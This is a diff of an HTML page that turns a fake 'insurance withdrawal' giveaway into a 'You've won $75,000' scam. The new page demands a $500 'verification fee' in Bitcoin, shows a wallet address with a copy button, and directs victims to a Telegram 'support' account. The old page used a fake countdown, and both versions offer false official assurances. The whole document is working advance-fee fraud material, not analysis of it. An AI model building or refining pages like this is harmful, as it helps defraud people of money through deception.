@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Insurance Company Withdrawal - Claim Your Funds</title>
+  <title>Congratulations – You've Won $75,000!</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -12,166 +12,203 @@
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
       font-family: 'Inter', system-ui, sans-serif;
-      background: #f8f9fa;
+      background: #f9fafb;
+      color: #111827;
       min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
+      padding: 16px;
+      line-height: 1.5;
     }
     .container {
-      background: white;
-      border-radius: 16px;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.08);
-      max-width: 480px;
+      max-width: 100%;
       width: 100%;
-      border: 1px solid #eee;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
       overflow: hidden;
+      margin: 0 auto;
     }
     .header {
-      background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
+      background: linear-gradient(135deg, #dc2626, #b91c1c);
       color: white;
-      padding: 60px 30px 40px;
+      padding: 48px 20px 32px;
       text-align: center;
       position: relative;
     }
     .header::before {
-      content: "💰";
+      content: "🏆";
       font-size: 80px;
       position: absolute;
-      top: 20px;
+      top: 16px;
       left: 50%;
       transform: translateX(-50%);
       opacity: 0.18;
     }
     .header h1 {
-      font-size: 2.4rem;
-      font-weight: 700;
-      margin-bottom: 12px;
-      text-shadow: 0 2px 8px rgba(0,0,0,0.3);
+      font-size: 2.3rem;
+      font-weight: 800;
+      margin-bottom: 8px;
+      text-shadow: 0 2px 6px rgba(0,0,0,0.4);
     }
     .header p {
-      font-size: 1.18rem;
-      opacity: 0.95;
+      font-size: 1.15rem;
+      opacity: 0.94;
     }
     .content {
-      padding: 36px 28px;
+      padding: 28px 20px;
       text-align: center;
     }
-    .amount {
-      font-size: 2.4rem;
+    .congrats-line {
+      font-size: 1.9rem;
       font-weight: 700;
-      color: #dc2626;
-      margin: 20px 0 28px;
-      line-height: 1.1;
+      color: #111827;
+      margin-bottom: 8px;
     }
-    .claim-btn {
-      display: inline-block;
+    .username {
+      font-size: 2.1rem;
+      font-weight: 800;
+      color: #dc2626;
+      margin: 4px 0 20px;
+    }
+    .prize {
+      font-size: 3rem;
+      font-weight: 800;
+      color: #dc2626;
+      margin: 12px 0 28px;
+      line-height: 1;
+    }
+    .box {
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 24px 0;
+    }
+    .box h3 {
+      color: #b91c1c;
+      font-size: 1.3rem;
+      margin-bottom: 14px;
+    }
+    .important {
+      font-size: 1.15rem;
+      font-weight: 600;
+      color: #991b1b;
+      margin: 16px 0 10px;
+    }
+    .btc-address {
+      background: #f3f4f6;
+      padding: 14px;
+      border-radius: 8px;
+      font-family: monospace;
+      font-size: 1.05rem;
+      word-break: break-all;
+      margin: 14px 0;
+      position: relative;
+    }
+    .copy-btn {
+      position: absolute;
+      right: 10px;
+      top: 10px;
       background: #dc2626;
       color: white;
-      font-size: 1.35rem;
-      font-weight: 700;
-      padding: 18px 72px;
-      border-radius: 50px;
-      text-decoration: none;
-      margin: 24px 0 32px;
-      transition: all 0.25s ease;
-      box-shadow: 0 10px 28px rgba(220, 38, 38, 0.35);
       border: none;
+      padding: 6px 12px;
+      border-radius: 6px;
+      font-size: 0.9rem;
       cursor: pointer;
     }
-    .claim-btn:hover {
-      background: #ef4444;
-      transform: translateY(-4px);
-      box-shadow: 0 16px 36px rgba(220, 38, 38, 0.45);
+    .copy-btn:hover { background: #ef4444; }
+    .btn {
+      display: block;
+      width: 100%;
+      background: #dc2626;
+      color: white;
+      font-size: 1.25rem;
+      font-weight: 700;
+      text-align: center;
+      padding: 16px;
+      border-radius: 10px;
+      text-decoration: none;
+      margin: 32px 0 20px;
+      box-shadow: 0 4px 16px rgba(220,38,38,0.3);
     }
-    .features {
-      display: flex;
-      flex-direction: column;
-      gap: 18px;
-      margin: 32px 0 24px;
-    }
-    .feature {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-      font-size: 1.08rem;
-      color: #374151;
-    }
-    .feature::before {
-      content: "✔";
-      color: #dc2626;
-      font-weight: bold;
-      font-size: 1.4rem;
-    }
-    .footer-note {
+    .btn:hover { background: #ef4444; }
+    .small {
       font-size: 0.95rem;
-      color: #6b7280;
-      margin-top: 32px;
-      line-height: 1.5;
+      color: #4b5563;
+      text-align: center;
+      margin-top: 20px;
     }
-    .urgent {
-      color: #dc2626;
-      font-weight: 600;
+
+    @media (min-width: 500px) {
+      .container { max-width: 480px; margin: 24px auto; }
     }
   </style>
 </head>
 <body>
 
 <script>
-  if (localStorage.getItem('withdrawalAuthenticated') !== 'true') {
-    alert("Please sign in or create an account first.");
-    window.location.href = 'index.html';
-  }
+// ─── Protect page ───────────────────────────────────────────
+if (localStorage.getItem('withdrawalAuthenticated') !== 'true') {
+  alert("Please sign in first.");
+  window.location.href = 'index.html';
+}
+
+// ─── Get current user ───────────────────────────────────────
+let currentEmail = localStorage.getItem('currentWithdrawalUser') || 'user@example.com';
+let displayName = currentEmail.split('@')[0] || 'User';
+
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('username').textContent = displayName;
+});
+
+// ─── Copy BTC address ───────────────────────────────────────
+function copyAddress() {
+  const addr = "bc1q5v5seccrx93qp7zrnjrr7uvc3tf4n35x0ujvs4";
+  navigator.clipboard.writeText(addr).then(() => {
+    const btn = document.getElementById('copyBtn');
+    btn.textContent = 'Copied!';
+    setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+  });
+}
 </script>
 
 <div class="container">
   <div class="header">
-    <h1>APPROVED!</h1>
-    <p>Your application For the Giveaway has been verified</p>
+    <h1>Congratulations!</h1>
+    <p>You are a selected winner</p>
   </div>
 
   <div class="content">
-    <h2 class="amount">$75,000 READY FOR WITHDRAWAL</h2>
 
-    <a
-      href="https://t.me/matildesimes3114"
-      class="claim-btn"
-      target="_blank"
-      rel="noopener noreferrer"
-    >
-      COMPLETE WITHDRAWAL NOW
-    </a>
+    <div class="congrats-line">Congratulations, <span id="username">User</span>!</div>
+    <div class="prize">You've won $75,000</div>
 
-    <div class="features">
-      <div class="feature">Instant processing via Telegram verification</div>
-      <div class="feature">Only few withdrawals left today</div>
-      <div class="feature">Official Insurance Company Withdrawal portal</div>
+    <div class="box">
+      <h3>One final step to claim your prize</h3>
+      <p>A one-time processing & verification fee of <strong>$500</strong> is required to release your winnings.</p>
+      <p class="important">Send exactly $500 in Bitcoin to the address below:</p>
+
+      <div class="btc-address">
+        bc1q5v5seccrx93qp7zrnjrr7uvc3tf4n35x0ujvs4
+        <button class="copy-btn" id="copyBtn" onclick="copyAddress()">Copy</button>
+      </div>
+
+      <p style="margin-top:16px; font-size:1.05rem;">
+        After sending the payment, contact support immediately to confirm your transaction and release your $75,000 prize.
+      </p>
     </div>
 
-    <p class="footer-note">
-      <span class="urgent">Time sensitive!</span> Complete your withdrawal within the next 
-      <span id="countdown">12 hours</span>.<br>
-      Click above to finalize on our secure Telegram channel.
+    <a href="https://t.me/Angel6543217a" class="btn" target="_blank" rel="noopener noreferrer">
+      Contact Support & Confirm Payment
+    </a>
+
+    <p class="small">
+      This is a standard final verification step.<br>
+      Prize will be released within 30–90 minutes after confirmation.
     </p>
+
   </div>
 </div>
-
-<script>
-// Simple countdown (visual only)
-let timeLeft = 12 * 60 * 60; // seconds
-
-function updateTimer() {
-  const h = Math.floor(timeLeft / 3600);
-  const m = Math.floor((timeLeft % 3600) / 60);
-  document.getElementById('countdown').textContent = `${h}h ${m}m`;
-  if (timeLeft > 0) timeLeft--;
-}
-
-setInterval(updateTimer, 60000);
-updateTimer();
-</script>
 
 </body>
 </html>
